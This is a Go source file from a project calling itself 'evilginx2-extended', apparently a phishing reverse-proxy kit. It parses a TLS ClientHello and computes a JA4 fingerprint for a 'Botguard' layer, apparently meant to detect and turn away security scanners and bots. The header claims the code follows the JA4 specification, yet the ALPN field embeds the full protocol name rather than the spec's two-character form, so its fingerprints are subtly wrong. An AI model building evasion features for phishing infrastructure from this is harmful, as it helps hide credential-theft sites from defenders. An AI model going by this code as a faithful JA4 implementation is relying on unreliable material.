package core

// ja4.go — evilginx2-extended: JA4 TLS client fingerprint (Botguard v3 layer).
// Implemented from the public FoxIO JA4 specification:
//   ja4 = t<ver><sni><ciphercount><extcount><firstcipher><lastcipher><alpn>
//         _ <sha256[:12] of cipher list> _ <sha256[:12] of extension list>
// GREASE values removed everywhere; SNI(0) and ALPN(16) are excluded from the
// extension hash. Parses the already-peeked first TLS record (the full
// ClientHello for every real client — >16KB hellos are rejected upstream).

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"
)

type JA4Result struct {
	JA4       string
	ALPN      string
	TLS13     bool
	HasGREASE bool
}

func ja4IsGREASE(v int) bool {
	return v >= 0x0a0a && (v>>8) == (v&0xff) && v&0x0f == 0x0a
}

// ParseClientHelloJA4 peeks one TLS record and computes the JA4 fingerprint.
// ok=false means the buffer did not contain a parseable ClientHello; callers
// must ignore the TLS signal in that case.
func ParseClientHelloJA4(br *bufio.Reader) (JA4Result, bool) {
	var res JA4Result
	h, err := br.Peek(5)
	if err != nil || h[0] != 0x16 {
		return res, false
	}
	rl := int(h[3])<<8 | int(h[4])
	need := 5 + rl
	if rl < 44 || need > 16400 {
		return res, false
	}
	buf, err := br.Peek(need)
	if err != nil {
		return res, false
	}
	hs := buf[5:]
	if hs[0] != 0x01 {
		return res, false
	}
	legacyVer := int(hs[4])<<8 | int(hs[5])
	sidLen := int(hs[38])
	p := 39 + sidLen
	if p+2 > len(hs) {
		return res, false
	}
	csLen := int(hs[p])<<8 | int(hs[p+1])
	p += 2
	if p+csLen > len(hs) {
		return res, false
	}
	var ciphers []int
	for i := 0; i+1 < csLen; i += 2 {
		v := int(hs[p+i])<<8 | int(hs[p+i+1])
		if ja4IsGREASE(v) {
			res.HasGREASE = true
			continue
		}
		ciphers = append(ciphers, v)
	}
	p += csLen
	if p+1 > len(hs) {
		return res, false
	}
	compLen := int(hs[p])
	p += 1 + compLen
	if p+2 > len(hs) {
		return res, false
	}
	extLen := int(hs[p])<<8 | int(hs[p+1])
	p += 2
	end := p + extLen
	if end > len(hs) {
		end = len(hs)
	}

	var exts []int
	alpn := "00"
	sni := false
	tls13 := false
	for p+4 <= end {
		et := int(hs[p])<<8 | int(hs[p+1])
		el := int(hs[p+2])<<8 | int(hs[p+3])
		p += 4
		if p+el > end {
			break
		}
		body := hs[p : p+el]
		if ja4IsGREASE(et) {
			res.HasGREASE = true
		} else {
			exts = append(exts, et)
			switch et {
			case 0:
				sni = true
			case 16:
				if len(body) >= 4 {
					pl := int(body[2])
					if 3+pl <= len(body) {
						alpn = strings.ToLower(string(body[3 : 3+pl]))
					}
				}
			case 43:
				// ClientHello: 1-byte version-list length, then 2-byte versions
				if len(body) >= 3 {
					listLen := int(body[0])
					for j := 1; j+1 < len(body) && j-1 < listLen; j += 2 {
						if body[j] == 0x03 && body[j+1] == 0x04 {
							tls13 = true
						}
					}
				}
			}
		}
		p += el
	}

	ver := "q"
	if tls13 {
		ver = "13"
	} else {
		switch legacyVer {
		case 0x0304:
			ver = "13"
		case 0x0303:
			ver = "12"
		case 0x0302:
			ver = "11"
		case 0x0301:
			ver = "10"
		case 0x0300:
			ver = "s3"
		}
	}

	firstC, lastC := "00", "00"
	if len(ciphers) > 0 {
		firstC = fmt.Sprintf("%04x", ciphers[0])
		lastC = fmt.Sprintf("%04x", ciphers[len(ciphers)-1])
	}

	var b strings.Builder
	for i, c := range ciphers {
		if i > 0 {
			b.WriteByte(',')
		}
		fmt.Fprintf(&b, "%04x", c)
	}
	hb := sha256.Sum256([]byte(b.String()))

	var c2 strings.Builder
	for _, e := range exts {
		if e == 0 || e == 16 {
			continue
		}
		if c2.Len() > 0 {
			c2.WriteByte(',')
		}
		fmt.Fprintf(&c2, "%04x", e)
	}
	hc := sha256.Sum256([]byte(c2.String()))

	sniCh := "i"
	if sni {
		sniCh = "d"
	}
	res.JA4 = fmt.Sprintf("t%s%s%02d%02d%s%s%s_%s_%s",
		ver, sniCh, len(ciphers), len(exts), firstC, lastC, alpn,
		hex.EncodeToString(hb[:])[:12], hex.EncodeToString(hc[:])[:12])
	res.ALPN = alpn
	res.TLS13 = tls13
	return res, true
}
